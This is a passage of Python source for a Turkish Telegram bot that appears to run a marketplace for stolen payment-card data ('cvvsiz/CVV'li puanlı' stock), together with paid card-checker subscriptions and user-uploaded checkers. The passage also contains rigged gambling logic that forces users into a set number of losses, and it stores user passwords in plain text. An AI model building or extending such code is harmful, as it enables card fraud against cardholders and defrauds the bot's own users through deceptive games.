JACKPOT_CHANCE = float(CONFIG["JACKPOT_CHANCE"])

balance_history = {}      # {user_id: [{'type','amount','note','time'}]}
pending_listing_approvals = {}  # {temp_id: listing_data} admin onayı bekleyen
seller_ratings = {}       # {user_id: {'total': int, 'count': int, 'reviews': []}}
bot_ratings = {}          # {user_id: {"stars": int, "time": str, "comment": str}}
BOT_RATE_LOW_MAX = 2      # <=2 yıldız → açıklama zorunlu
min_withdraw = float(CONFIG["MIN_WITHDRAW"])
withdraw_commission = float(CONFIG["WITHDRAW_COMMISSION"])
daily_quests = {}         # {user_id: {'date', 'slot':0, 'ilan':0, 'claimed':False}}
user_xp = {}              # {user_id: int}
user_level = {}           # {user_id: int}
pvp_challenges = {}       # {chal_id: {...}}
wheel_claims = {}         # {user_id: "YYYY-MM-DD"}
daily_box_claims = {}     # {user_id: "YYYY-MM-DD"} günlük şans kutusu
group_claim_codes = {}    # {CODE: {reward, max_uses, uses, claimed: [uid], note, created}}
user_activity_week = {}   # {user_id: score} haftalik aktiflik
activity_week_start = None
daily_checkin_claims = {}  # {user_id: "YYYY-MM-DD"}
online_presence = {}       # {user_id: last_seen_unix}
ONLINE_WINDOW_SEC = 15 * 60  # 15 dk = aktif say
CHECKIN_REWARD = 2.0         # günlük check-in ödülü (TL)
CHECKIN_STREAK_BONUS = {     # ekstra (seri gün → TL) — update_login_streak ile çakışmasın diye yedek
  3: 3.0,
  7: 8.0,
  14: 20.0,
  30: 50.0,
}

VIP_CHAT_MIN_BALANCE = 500.0  # VIP sohbet için min normal+kumar
activity_logs = []        # [{'action','user_id','detail','time'}]
user_fingerprints = {}    # {user_id: {'last_seen', 'devices': set/list}} anti-abuse
referral_week_stats = {}  # {user_id: invite_count} haftalık yarışma
referral_week_start = None
login_attempts = {}       # {identifier: {'count', 'last'}}
maintenance_message = "🔧 Bot bakımda. Lütfen daha sonra tekrar deneyin."
user_notifications = {}   # {user_id: [{'text','read','time'}]}
user_currency = {}        # {user_id: 'TL'/'USDT'}
USDT_RATE = float(CONFIG["USDT_RATE"])
bot_running = True
BACKUP_DIR = "backups"
scammer_reports = {}      # {report_id: {accused, reporter, desc, photo, time, approved}}
pending_scammer_reports = {}  # admin onayı bekleyen
BUG_REPORT_REWARD = 50.0
bug_reports = {}          # {report_id: {reporter, text, photo, time, status}}
pending_bug_reports = {}  # admin onayı bekleyen

channel_bonus_claimed = set()   # {user_id}
login_streaks = {}              # {user_id: {'last_date': 'YYYY-MM-DD', 'count': int}}
user_achievements = {}          # {user_id: [ach_id, ...]}
active_polls = {}               # {poll_id: {question, options:[{text,votes:set}], created_by, closed}}
BACKUP_HOUR = int(CONFIG.get("BACKUP_HOUR", 3))

ACHIEVEMENTS = {
  "first_login":   {"name": "Hoş Geldin", "desc": "İlk giriş", "reward": 2.0, "xp": 10},
  "streak_3":      {"name": "3 Gün Seri", "desc": "3 gün üst üste giriş", "reward": 5.0, "xp": 20},
  "streak_7":      {"name": "Haftalık", "desc": "7 gün üst üste giriş", "reward": 15.0, "xp": 50},
  "streak_14":     {"name": "İki Hafta", "desc": "14 gün üst üste giriş", "reward": 40.0, "xp": 100},
  "first_ilan":    {"name": "İlancı", "desc": "İlk ilan ekle", "reward": 5.0, "xp": 15},
  "slot_10":       {"name": "Slot Ustası", "desc": "10 slot oyna", "reward": 8.0, "xp": 25},
  "ref_3":         {"name": "Davetçi", "desc": "3 kişi davet et", "reward": 10.0, "xp": 30},
  "ref_10":        {"name": "Büyükelçi", "desc": "10 kişi davet et", "reward": 30.0, "xp": 80},
  "level_5":       {"name": "Seviye 5", "desc": "Level 5'e ulaş", "reward": 10.0, "xp": 0},
  "channel_join":  {"name": "Kanal Üyesi", "desc": "Kanala katıl", "reward": 0.0, "xp": 15},
  "first_coupon":  {"name": "Kupon Avcısı", "desc": "İlk kuponu kullan", "reward": 3.0, "xp": 10},
}
slot_play_counts = {}  # {user_id: int} başarımlar için
checker_usage = {}  # {user_id: int} toplam checker tarama sayısı
LEVEL_SHOP = {
  'log_free': {'name': '3 Ücretsiz Log Hakkı', 'xp_cost': 50, 'type': 'log_free', 'amount': 3},
  'bal_5': {'name': '+5 TL Bakiye', 'xp_cost': 80, 'type': 'balance', 'amount': 5.0},
  'bal_15': {'name': '+15 TL Bakiye', 'xp_cost': 200, 'type': 'balance', 'amount': 15.0},
  'discount': {'name': 'Market %10 İndirim (24s)', 'xp_cost': 120, 'type': 'discount', 'amount': 0.10},
}
user_discounts = {}  # {user_id: {'until': ts, 'rate': 0.10}}

earn_tasks = {}            # {task_id: {title, desc, reward, active}}
user_earn_claims = {}      # {user_id: [task_id, ...]}  # tamamlanan görevler
pending_earn_claims = {}   # {claim_id: {user_id, task_id, reward, file_id, time, status}}
EARN_AUTO_APPROVE_SEC = 600  # 10 dakika admin yoksa otomatik onay
DEFAULT_EARN_REWARD = 5.0
MINES_COUNT = 4
MINES_MULT_PER_STEP = 0.18  # her güvenli kutu +0.18x
MINES_BASE_MULT = 1.0
MAX_GAMBLE_BET = 500.0           # tek bahis üst limiti (TL) — exploit engeli
MAX_GAMBLE_BALANCE = 6000.0      # kumar bakiyesi tavanı (TL)

MAX_MARKET_BUY_QTY = 100         # marketten tek seferde max alım adedi
MAX_MARKET_DAILY_QTY = 300       # abonesiz günlük market alım
MAX_MARKET_DAILY_QTY_SUB = 100   # checker abonesi günlük market max
MARKET_STOCK_WARN = 10           # stok bu altına inince admin uyar

CHECKER_SUB_PLANS = {
  "1d":   {"days": 1,    "tl": 80.0,  "stars": 10,  "title": "1 Gün Sınırsız"},
  "7d":   {"days": 7,    "tl": 350.0, "stars": 35,  "title": "7 Gün Sınırsız"},
  "30d":  {"days": 30,   "tl": 900.0, "stars": 90,  "title": "30 Gün Sınırsız"},
  "life": {"days": 0,    "tl": 1000.0,"stars": 120, "title": "Sınırsız (Ömür Boyu)"},  # days=0 → lifetime
}
checker_subs = {}  # {user_id: {"plan": str, "until": float|0, "bought": str}}
sub_remind_sent = {}
sub_purchase_log = []
quest_card_claims = {}
QUEST_CARD_REWARD = 5.0
premium_codes = {}  # {CODE: {plan, buyer_id, created, used_by, used_at, via}}

gamble_history = {}       # {user_id: [{game,bet,result,delta,time}, ...]}
market_daily_buys = {}    # {user_id: {"date": "YYYY-MM-DD", "qty": int}}
checker_favorites = {}    # {user_id: [key, ...]}  max 5
checker_recent = {}       # {user_id: [key, ...]}  max 8
user_unread_notifs = {}   # {user_id: int} cache
stock_warn_sent = {}      # {stock_file: last_ts}
CUSTOM_CHK_DIR = "custom_checkers"
custom_checkers = {}          # {cid: {name, author_id, file, desc, active, uses}}
custom_checkers_pending = {}  # {cid: {name, author_id, file, desc, time, username}}
active_custom_chk_jobs = {}   # {user_id: job}

HOUSE_EDGE_PAYOUT = 2.0         # yazı-tura / TKM kazanç çarpanı
GAMBLE_MIN_LOSSES = 1
GAMBLE_MAX_LOSSES = 4
GAMBLE_INSTANT_WIN_CHANCE = 0.18  # %18
SLOT_WIN_CHANCE = 0.22            # slot ayrı, daha sıkı
SLOT_WIN_CHANCE = 0.28          # oto slot ~%28 kazanç (ev avantajı)
SLOT_PAYOUTS = (1.15, 1.25, 1.35, 1.45, 1.55)  # düşük çarpanlar
SLOT_TRIPLE_CHANCE = 0.08       # üçlü nadir, biraz daha yüksek ödeme
SLOT_TRIPLE_PAYOUT = 2.2
gamble_loss_streak = {}      # {user_id: ardışık kayıp}
gamble_next_win_after = {}   # {user_id: kaç kayıptan sonra 1 kazanç}

def gamble_allow_win(user_id):
  """
  Kumar sonucu — ev avantajı.
  False → zorunlu kayıp | True → kazanç hakkı
  """
  if user_id not in gamble_next_win_after:
    if random.random() < float(globals().get("GAMBLE_INSTANT_WIN_CHANCE", 0.25)):
      gamble_next_win_after[user_id] = 0
    else:
      gamble_next_win_after[user_id] = random.randint(1, 3)
  streak = int(gamble_loss_streak.get(user_id, 0))
  target = int(gamble_next_win_after.get(user_id, 1))
  if streak >= target:
    gamble_loss_streak[user_id] = 0
    r = random.random()
    if r < 0.18:
      target = 0
    elif r < 0.45:
      target = 1
    elif r < 0.75:
      target = 2
    elif r < 0.92:
      target = 3
    else:
      target = 4
    lo = int(globals().get("GAMBLE_MIN_LOSSES", 1))
    hi = int(globals().get("GAMBLE_MAX_LOSSES", 4))
    gamble_next_win_after[user_id] = max(lo, min(hi, target))
    try:
      save_data()
    except Exception:
      pass
    return True
  gamble_loss_streak[user_id] = streak + 1
  try:
    save_data()
  except Exception:
    pass
  return False

def gamble_allow_win_slot(user_id):
  """Oto slot — ayrı, daha sıkı şans."""
  return random.random() < float(globals().get("SLOT_WIN_CHANCE", 0.28))

LOSS_REBATE_RATE = 0.40
LOSS_REBATE_MIN = 50.0
gamble_cycle_lost = {}       # {user_id: bu döngüde kaybedilen TL}
gamble_rebate_notified = {}  # spam engeli

registered_users = set()
user_credentials = {}    # {user_id: {'reg_username': str, 'email': str, 'password': str, 'logged_in': bool}}
banned_users = set()
hard_banned_users = set()  # Süper ban — normal unban ile AÇILMAZ
pending_hard_bans = {}  # {user_id: {"reason": str, "warns": int, "time": float}}
support_warns = {}  # {user_id: int} boş/spam destek uyarı sayısı
SUPPORT_WARN_LIMIT = 3
SUPPORT_MIN_LEN = 2  # sadece gerçekten boş/çok kısa
temp_banned_users = {}   # {user_id: expire_timestamp}
unban_requests_sent = set()
chat_unban_requests_sent = set()  # Chat/grup ban kaldırma talepleri
admin_ids_set = set(DEFAULT_ADMINS)
user_balances = {}
user_gamble_balances = {}  # Kumar bakiyesi — sadece şans oyunlarında kullanılır
last_gamble_bonus = {}     # {user_id: timestamp} son +1000 kumar bonusu zamanı
GAMBLE_BONUS_AMOUNT = 1000.0
GAMBLE_BONUS_INTERVAL = 7200  # 2 saat (saniye)
ref_balances = {}
user_referrers = {}
pending_orders = {}
pending_vip_orders = {}
pending_listing_orders = {}
withdrawal_requests = {}
pending_star_payments = {}  # {pay_id: {user_id, amount_tl, stars, time, status, username}}
STAR_TL_PER_STAR = 2.0
STAR_ADMIN_CLAIM_RATE = 3.0  # admine gönderince 1⭐ = 3 TL (1000⭐ → 3000 TL)
STAR_MIN = 1
STAR_MAX = 5000  # tek işlem üst limit
STAR_QUICK = [5, 10, 25, 50, 100, 250, 500]
STAR_RECEIVER_ID = int(CONFIG.get("STAR_RECEIVER_ID") or 0)
STAR_RECEIVER_USERNAME = (CONFIG.get("STAR_RECEIVER_USERNAME") or "").strip()
STAR_GAMBLE_PER_STAR = 10.0
STAR_GAMBLE_MIN = 10
STAR_GAMBLE_MAX = 5000
STAR_GAMBLE_QUICK = [100, 50, 200, 500, 1000]  # yıldız; 100⭐=1000 kumar
listings = {}
coupons = {}
active_tickets = {}
gambling_profits = {}    # {user_id: net_profit}
custom_member_categories = {} # {cat_id: {'name': name, 'desc': desc}}
user_languages = {}      # {user_id: 'tr' / 'ku' / 'en'}   ← YENİ

user_request_times = {}
SPAM_LIMIT = 5
SPAM_TIME = 3
TEMP_BAN_DURATION = 86400

market_data = {
  "1x_cvvsiz_puanli": {
    "name": "1x cvvsiz puanlı",
    "price": 3.0,
    "stock_file": STOCK_FILE_CVV
  }
}

vip_market_data = {
  "1x_cvv_li_puanli": {
    "name": "1x CVV'li puanlı",
    "price": 450.0
  }
}

for key, data in market_data.items():
  if not os.path.exists(data["stock_file"]):
    with open(data["stock_file"], "w", encoding="utf-8") as f:
      f.write("")

LANGUAGES = {
  "tr": "🇹🇷 Türkçe"
}

TRANSLATIONS = {
  "tr": {
    "lang_select": "🌍 Lütfen dilinizi seçin / Please select your language / Zimanê xwe hilbijêre:",
    "lang_changed": "✅ Diliniz başarıyla değiştirildi!",
    "welcome_auth": "🔐 **KAYIT VE GİRİŞ SİSTEMİ**\n\nSisteme erişmek için lütfen yeni bir hesap oluşturun veya var olan hesabınıza giriş yapın:",
    "btn_register": "📝 Kayıt Ol",
    "btn_login": "🔐 Giriş Yap",
    "main_menu_title": "🤖 **{brand}**\n📅 `{time}`\n💵 Bakiye: **{bal:.2f} TL** · 🎲 Kumar: **{gbal:.2f} TL**\n\nAşağıdan menü seç:",
    "btn_account": "👤 ══ HESABIM ══",
    "btn_listings": "📢 ══ İLANLAR / PAZAR ══",
    "btn_market": "🛒 ══ MARKET ══",
    "btn_vip_market": "⭐ ══ VIP MARKET ══",
    "btn_live_chat": "💬 ══ CANLI SOHBET ══",
    "btn_gambling": "🎰 ══ KUMAR & ŞANS ══",
    "btn_referans": "👥 ══ REFERANS ══",
    "btn_bakiye": "💳 ══ BAKIYE / CÜZDAN ══",
    "btn_personal": "⚙️ ══ KİŞİSEL ══",
    "btn_support": "🎫 ══ DESTEK ══",
    "btn_admin": "👑 ══ ADMIN PANEL ══",
    "btn_change_lang": "🌍 Dil Değiştir",
    "btn_back_main": "🔙 Ana Menü",
    "banned_msg": "❌ Bu botu kullanmanız yöneticiler veya sistem tarafından engellenmiştir.",
    "temp_ban_msg": "⏳ Süreli banlandınız! Kalan ceza süreniz: **{hours} Saat {mins} Dakika**.",
    "btn_request_unban": "🔓 Ban Kaldırma Talebi Gönder",
    "account_menu": "👤 **HESABIM KATEGORİSİ**\n\nHoş Geldin, **{user}**!\nAşağıdaki butonlardan hesabınızı yönetebilirsiniz:",
    "profile_title": "📋 **PROFİL BİLGİLERİNİZ**\n\n🆔 **Telegram ID:** `{uid}`\n👤 **Kullanıcı Adı:** `{uname}`\n📧 **E-Posta Adresi:** `{email}`\n💵 **Normal Bakiye:** `{bal:.2f} TL`\n💰 **Referans Bakiyesi:** `{ref:.2f} TL`\n🟢 **Oturum Durumu:** Aktif\n",
    "balance_title": "💳 **Cüzdan ve Güncel Bakiye Bilgileri**\n\n💵 Normal Bakiye: **{bal:.2f} TL**\n💰 Referans Bakiyesi: **{ref:.2f} TL**\n\nℹ️ Bakiyenizi kullanabilir veya başka kullanıcılara transfer edebilirsiniz.",
    "live_chat_active": "💬 **Anonim Canlı Sohbet Odası Aktif!**\n📅 {time}\n\nOdadaki diğer kullanıcılarla anonim olarak mesajlaşabilirsiniz.",
    "btn_exit_live": "🚪 Canlı Sohbetten Çık",
    "market_title": "🛒 **Normal Market (Txt Otomatik Teslimat)**\n\n💵 Bakiye: **{bal:.2f} TL**",
    "vip_market_title": "⭐ **VIP Market (IBAN ile Ödeme)**",
    "gambling_title": "🎰 **Şans Oyunları**\n💵 Bakiyeniz: **{bal:.2f} TL**",
    "personal_title": "👤 **Kişisel Kullanım**",
    "referans_title": "👥 **Referans Sistemi**\nLink: `https://t.me/{bot}?start={uid}`\n💰 Referans Bakiyesi: **{ref:.2f} TL**\n💵 Normal Bakiye: **{bal:.2f} TL**",
    "support_title": "🎫 **Destek Merkezi**",
    "admin_title": "👑 **Admin Paneli**",
    "lang_menu_title": "🌍 **Dil Seçimi**\n\nMevcut diliniz: **{current}**\nYeni dil seçin:",
  },
}

def get_lang(user_id):
  return user_languages.get(user_id, "tr")

LANG_MUSIC_FILES = {
  "tr": [
    "osman_pasa.mp3", "music/osman_pasa.mp3", "tr_osman_pasa.mp3",
    "Mehter-Marslari-Osman-Pasa.mp3", "Mehter-Marslari-Osman -Pasa.mp3",
  ],
  "ku": [
    "ey_raqip.mp3", "music/ey_raqip.mp3", "ku_ey_raqip.mp3", "eyreqip.mp3",
    "Karisik-Sesler-Kurt-Milli-Marsi-Ey-Regip.mp3",
    "Karisik-Sesler-Kurt-Milli-Marsi-Ey-Regîp.mp3",
  ],
}
LANG_MUSIC_TITLES = {
  "tr": "🎵 Şanı Büyük Osman Paşa",
  "ku": "🎵 Ey Reqîb (Kurdî)",
  "en": None,
}
LANG_MUSIC_SAVE = {
  "tr": "osman_pasa.mp3",
  "ku": "ey_raqip.mp3",
}

def lang_music_status_text():
  lines = ["🎵 **Karşılama şarkıları**"]
  for code, title in (("tr", "TR Osman Paşa"), ("ku", "KU Ey Reqîb")):
    found = None
    for p in LANG_MUSIC_FILES.get(code, []):
      if os.path.isfile(p):
        found = p
        break
    if found:
      try:
        sz = os.path.getsize(found)
        lines.append(f"✅ {title}: `{found}` ({format_bytes(sz)})")
      except Exception:
        lines.append(f"✅ {title}: `{found}`")
    else:
      lines.append(f"❌ {title}: yok — Admin menüden yükle")
  return "\n".join(lines)

def send_lang_welcome_music(chat_id, user_id):
  """Dil seçimine göre şarkı gönder; dosya yoksa sessiz geç."""
  lang = get_lang(user_id)
  title = LANG_MUSIC_TITLES.get(lang)
  paths = LANG_MUSIC_FILES.get(lang) or []
  if not title or not paths:
    return False
  path = None
  for p in paths:
    if os.path.isfile(p):
      path = p
      break
  if not path:
    try:
      bot.send_message(
        chat_id,
        f"{title}\n\nℹ️ Şarkı dosyası sunucuda yok.\n"
        f"Admin bot klasörüne şunlardan birini koysun:\n`{'` / `'.join(paths)}`\n"
        f"Sonra dil seçince otomatik gider. İstersen açıp dinlersin.",
        parse_mode="Markdown"
      )
    except Exception:
      pass
    return False
  try:
    with open(path, "rb") as audio:
      bot.send_audio(chat_id, audio, title=title, caption=f"{title}\nİstersen açıp dinleyebilirsin 🎧")
    return True
  except Exception as e:
    log_error("send_lang_music", e)
    return False

def get_user_title(user_id):
  """Level / aktiviteye göre unvan."""
  lvl = int(user_level.get(user_id, 1) or 1)
  if user_id in admin_ids_set:
    return "👑 Admin"
  if lvl >= 20:
    return "💎 Elmas"
  if lvl >= 15:
    return "🏆 Ustalar"
  if lvl >= 10:
    return "🥇 Altın"
  if lvl >= 5:
    return "🥈 Gümüş"
  if lvl >= 2:
    return "🥉 Bronz"
  return "🌱 Yeni"

def get_wallet_text(user_id):
  n = float(user_balances.get(user_id, 0.0))
  g = float(user_gamble_balances.get(user_id, 0.0))
  r = float(ref_balances.get(user_id, 0.0))
  title = get_user_title(user_id)
  lvl = int(user_level.get(user_id, 1) or 1)
  return (
    f"💳 **Cüzdan Özeti**\n"
    f"🏅 Unvan: **{title}** (Lv.{lvl})\n\n"
    f"💵 Normal: **{n:.2f} TL**\n"
    f"🎲 Kumar: **{g:.2f} TL**\n"
    f"💰 Referans: **{r:.2f} TL**\n"
    f"📦 Toplam: **{(n+g+r):.2f} TL**"
  )

def t(user_id, key, **kwargs):
  lang = get_lang(user_id)
  text = TRANSLATIONS.get(lang, TRANSLATIONS["tr"]).get(key, TRANSLATIONS["tr"].get(key, key))
  kwargs = dict(kwargs or {})
  if "brand" not in kwargs:
    kwargs["brand"] = BOT_BRAND
  try:
    return text.format(**kwargs)
  except Exception:
    try:
      return text.format(brand=BOT_BRAND)
    except Exception:
      return text

def get_current_time_str():
  now = datetime.now()
  return now.strftime("%d.%m.%Y %H:%M:%S")

def ai_ask(user_id: int, user_text: str, mode: str = "normal") -> str:
  """mode: normal | nsfw — oturumlar ayrı."""
  key = (AI_API_KEY or "").strip()
  if not key:
    return "⚠️ AI kapalı. Admin config.json → AI_API_KEY eklemeli."
  text = (user_text or "").strip()[:4000]
  if not text:
    return "⚠️ Boş mesaj."

  mode = "nsfw" if mode == "nsfw" else "normal"
  sess_key = f"{user_id}:{mode}"
  hist = ai_sessions.setdefault(sess_key, {"messages": [], "mode": mode})
  messages = list(hist.get("messages") or [])
  messages.append({"role": "user", "content": text})
  messages = messages[-(AI_MAX_HISTORY):]

  if mode == "nsfw":
    system = (
      "Sen yetişkinlere yönelik (+18) flört ve erotik sohbet asistanısın. "
      "Kullanıcı yetişkin; açık, cesur, isteklerine uyumlu Türkçe cevap ver. "
      "Sadece rızaya dayalı yetişkin fantezileri. "
      "18 yaş altı, çocuk, zorlama veya yasadışı içerik üretme; reddet. "
      "Samimi ve akıcı ol."
    )
    temp, max_tok = 0.9, 1200
  else:
    system = (
      "Sen NAPİM Telegram botunun yardımcı asistanısın. "
      "Kısa, net ve Türkçe cevap ver. "
      "Yasadışı veya zararlı istekleri nazikçe reddet."
    )
    temp, max_tok = 0.7, 900

  payload = {
    "model": AI_MODEL,
    "messages": [{"role": "system", "content": system}, *messages],
    "temperature": temp,
    "max_tokens": max_tok,
  }
  try:
    r = requests.post(
      f"{AI_BASE_URL}/chat/completions",
      headers={
        "Authorization": f"Bearer {key}",
        "Content-Type": "application/json",
      },
      json=payload,
      timeout=60,
    )
    if r.status_code != 200:
      log_error(f"ai_ask_http_{r.status_code}", Exception((r.text or "")[:400]))
      if user_id in admin_ids_set:
        return f"⚠️ AI HTTP {r.status_code}: `{(r.text or '')[:200]}`"
      return "⚠️ AI geçici olarak yanıt veremedi. Biraz sonra tekrar dene."
    data = r.json()
    reply = (
      (data.get("choices") or [{}])[0]
      .get("message", {})
      .get("content", "")
      or ""
    ).strip()
    if not reply:
      return "⚠️ Boş yanıt geldi."
    messages.append({"role": "assistant", "content": reply})
    hist["messages"] = messages[-(AI_MAX_HISTORY):]
    hist["mode"] = mode
    ai_sessions[sess_key] = hist
    return reply[:4000]
  except Exception as e:
    log_error("ai_ask", e)
    return "⚠️ AI bağlantı hatası. Sonra tekrar dene."

def ai_clear_session(user_id: int, mode: str = None):
  if mode in ("normal", "nsfw"):
    ai_sessions.pop(f"{user_id}:{mode}", None)
    return
  for k in list(ai_sessions.keys()):
    if str(k).startswith(f"{user_id}:"):
      ai_sessions.pop(k, None)

def get_stock_list(file_path):
  if not os.path.exists(file_path):
    return []
  with open(file_path, "r", encoding="utf-8") as f:
    lines = [line.strip() for line in f.readlines() if line.strip()]
  return lines

def remove_first_stock(file_path):
  lines = get_stock_list(file_path)
  if lines:
    item = lines.pop(0)
    with open(file_path, "w", encoding="utf-8") as f:
      f.write("\n".join(lines) + ("\n" if lines else ""))
    return item
  return None

def remove_n_stock(file_path, n):
  """Stoktan n adet düş; düşülen satırları döndür."""
  try:
    n = int(n)
  except Exception:
    n = 0
  if n <= 0:
    return []
  lines = get_stock_list(file_path)
  if not lines:
    return []
  take = min(n, len(lines))
  taken = lines[:take]
  rest = lines[take:]
  with open(file_path, "w", encoding="utf-8") as f:
    f.write("\n".join(rest) + ("\n" if rest else ""))
  return taken

def add_stocks_to_file(file_path, new_items):
  lines = get_stock_list(file_path)
  lines.extend(new_items)
  with open(file_path, "w", encoding="utf-8") as f:
    f.write("\n".join(lines) + ("\n" if lines else ""))

def is_username_taken(username):
  for creds in user_credentials.values():
    if creds.get('reg_username', '').strip().lower() == username.strip().lower():
      return True
  return False

def is_email_taken(email):
  for creds in user_credentials.values():
    if creds.get('email', '').strip().lower() == email.strip().lower():
      return True
  return False

def find_account_by_identifier(identifier):
  clean_id = identifier.strip().lower()
  for uid, creds in user_credentials.items():
    if creds.get('reg_username', '').strip().lower() == clean_id or creds.get('email', '').strip().lower() == clean_id:
      return uid, creds
  return None, None

def load_data():
  """DB yükle — alan hatalarına toleranslı; bozuksa yedekten dene."""
  global _DB_LOAD_OK
  global registered_users, user_credentials, banned_users, temp_banned_users, unban_requests_sent, admin_ids_set
  global user_balances, ref_balances, user_referrers, pending_orders, pending_vip_orders
  global pending_listing_orders, withdrawal_requests, listings, coupons, active_tickets, gambling_profits
  global market_data, vip_market_data, custom_member_categories, user_languages

  def _i(k):
    try:
      return int(k)
    except Exception:
      return k

  def _safe_int_dict(d, cast_val=None):
    out = {}
    if not isinstance(d, dict):
      return out
    for k, v in d.items():
      try:
        ik = int(k)
      except Exception:
        continue
      try:
        out[ik] = cast_val(v) if cast_val else v
      except Exception:
        try:
          out[ik] = v
        except Exception:
          pass
    return out

  def _safe_set_int(lst):
    s = set()
    for x in (lst or []):
      try:
        s.add(int(x))
      except Exception:
        pass
    return s

  def _read_json_file(fp):
    with open(fp, "r", encoding="utf-8") as f:
      raw = f.read()
    if not raw.strip():
      raise ValueError("boş dosya")
    return json.loads(raw)

  def _candidate_paths():
    paths = []
    if os.path.exists(DB_FILE):
      paths.append(DB_FILE)
    for bdir in (DB_BACKUP_DIR, BACKUP_DIR if "BACKUP_DIR" in globals() else "backups"):
      try:
        if not os.path.isdir(bdir):
          continue
        files = [
          os.path.join(bdir, x)
          for x in os.listdir(bdir)
          if x.startswith("database_") and x.endswith(".json")
        ]
        files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
        paths.extend(files[:5])
      except Exception:
        pass
    for alt in (DB_FILE + ".bak", DB_FILE + ".old", "database.json.bak"):
      if os.path.exists(alt) and alt not in paths:
        paths.append(alt)
    return paths

  data = None
  used_path = None
  last_err = None
  for fp in _candidate_paths():
    try:
      data = _read_json_file(fp)
      if not isinstance(data, dict):
        raise ValueError("JSON dict değil")
      used_path = fp
      break
    except Exception as e:
      last_err = e
      continue

  if data is None:
    if os.path.exists(DB_FILE):
      _DB_LOAD_OK = False
      print(f"⚠️ Veri yüklenirken hata (KAYIT ENGELLENDİ): {last_err}")
      try:
        log_error("load_data", last_err)
      except Exception:
        pass
      return
    _DB_LOAD_OK = True
    print(f"ℹ️ Yeni kurulum: {DB_FILE} yok, boş state ile başlanıyor.")
    return

  try:
    registered_users = _safe_set_int(data.get("registered_users", []))
    user_credentials = _safe_int_dict(data.get("user_credentials", {}))
    banned_users = _safe_set_int(data.get("banned_users", []))
    global hard_banned_users, support_warns, pending_hard_bans
    hard_banned_users = _safe_set_int(data.get("hard_banned_users", []))
    pending_hard_bans = _safe_int_dict(data.get("pending_hard_bans", {}))
    support_warns = _safe_int_dict(data.get("support_warns", {}), int)
    temp_banned_users = _safe_int_dict(data.get("temp_banned_users", {}))
    unban_requests_sent = _safe_set_int(data.get("unban_requests_sent", []))
    global chat_unban_requests_sent
    chat_unban_requests_sent = _safe_set_int(data.get("chat_unban_requests_sent", []))
    loaded_admins = data.get("admin_ids", DEFAULT_ADMINS) or DEFAULT_ADMINS
    admin_ids_set = _safe_set_int(loaded_admins)
    admin_ids_set.update(DEFAULT_ADMINS)
    admin_ids_set.update(LOCKED_ADMIN_IDS)
    try:
      global BOT_BRAND
      _br = (data.get("bot_brand") or os.environ.get("CC_BOT_BRAND") or BOT_BRAND or "NAPİM CHK")
      if _br:
        BOT_BRAND = str(_br).strip()[:32]
    except Exception:
      pass
    for admin in list(admin_ids_set):
      banned_users.discard(admin)
      temp_banned_users.pop(admin, None)

    user_balances = _safe_int_dict(data.get("user_balances", {}), lambda v: float(v or 0))
    global user_gamble_balances, last_gamble_bonus, user_fingerprints, referral_week_stats, referral_week_start
    user_gamble_balances = _safe_int_dict(data.get("user_gamble_balances", {}), lambda v: float(v or 0))
    try:
      _cap = float(MAX_GAMBLE_BALANCE)
      for _uid in list(user_gamble_balances.keys()):
        if float(user_gamble_balances.get(_uid) or 0) > _cap:
          user_gamble_balances[_uid] = _cap
    except Exception:
      pass
    last_gamble_bonus = _safe_int_dict(data.get("last_gamble_bonus", {}), lambda v: float(v or 0))
    user_fingerprints = _safe_int_dict(data.get("user_fingerprints", {}))
    referral_week_stats = _safe_int_dict(data.get("referral_week_stats", {}), lambda v: int(v or 0))
    referral_week_start = data.get("referral_week_start", None)
    ref_balances = _safe_int_dict(data.get("ref_balances", {}), lambda v: float(v or 0))
    user_referrers = _safe_int_dict(data.get("user_referrers", {}))
    pending_orders = data.get("pending_orders", {}) or {}
    pending_vip_orders = data.get("pending_vip_orders", {}) or {}
    pending_listing_orders = data.get("pending_listing_orders", {}) or {}
    withdrawal_requests = data.get("withdrawal_requests", {}) or {}
    global pending_star_payments
    pending_star_payments = data.get("pending_star_payments", {}) or {}
    global smm_orders
    smm_orders = data.get("smm_orders", {}) or {}
    listings = data.get("listings", {}) or {}
    raw_coupons = data.get("coupons", {}) or {}
    coupons = {}
    for ck, cv in raw_coupons.items():
      try:
        if isinstance(cv, dict):
          coupons[ck] = {
            "value": float(cv.get("value", 0)),
            "max_uses": int(cv.get("max_uses", 1)),
            "used_count": int(cv.get("used_count", 0)),
            "expires_at": cv.get("expires_at"),
            "min_level": int(cv.get("min_level", 1)),
          }
        else:
          coupons[ck] = {
            "value": float(cv),
            "max_uses": 1,
            "used_count": 0,
            "expires_at": None,
            "min_level": 1,
          }
      except Exception:
        pass
    active_tickets = data.get("active_tickets", {}) or {}
    gambling_profits = _safe_int_dict(data.get("gambling_profits", {}), lambda v: float(v or 0))
    custom_member_categories = data.get("custom_member_categories", {}) or {}
    user_languages = _safe_int_dict(data.get("user_languages", {}))

    global daily_bonus_claims, jackpot_pool, tournament_week_start, maintenance_mode
    daily_bonus_claims = _safe_int_dict(data.get("daily_bonus_claims", {}))
    try:
      jackpot_pool = float(data.get("jackpot_pool", 0.0) or 0.0)
    except Exception:
      jackpot_pool = 0.0
    tournament_week_start = data.get("tournament_week_start", None)
    maintenance_mode = bool(data.get("maintenance_mode", False))
    global maintenance_until
    try:
      mu = data.get("maintenance_until", None)
      maintenance_until = float(mu) if mu else None
    except Exception:
      maintenance_until = None
    global feature_3dsiz_enabled, feature_telz_enabled
    feature_3dsiz_enabled = bool(data.get("feature_3dsiz_enabled", True))
    feature_telz_enabled = bool(data.get("feature_telz_enabled", False))

    global balance_history, pending_listing_approvals, seller_ratings, min_withdraw, withdraw_commission
    global daily_quests, user_xp, user_level, wheel_claims, activity_logs, maintenance_message
    global user_notifications, user_currency
    balance_history = _safe_int_dict(data.get("balance_history", {}))
    pending_listing_approvals = data.get("pending_listing_approvals", {}) or {}
    seller_ratings = _safe_int_dict(data.get("seller_ratings", {}))
    try:
      min_withdraw = float(data.get("min_withdraw", min_withdraw))
    except Exception:
      pass
    try:
      withdraw_commission = float(data.get("withdraw_commission", withdraw_commission))
    except Exception:
      pass
    daily_quests = _safe_int_dict(data.get("daily_quests", {}))
    user_xp = _safe_int_dict(data.get("user_xp", {}), lambda v: int(v or 0))
    user_level = _safe_int_dict(data.get("user_level", {}), lambda v: int(v or 1))
    wheel_claims = _safe_int_dict(data.get("wheel_claims", {}))
    global daily_box_claims
    daily_box_claims = _safe_int_dict(data.get("daily_box_claims", {}))
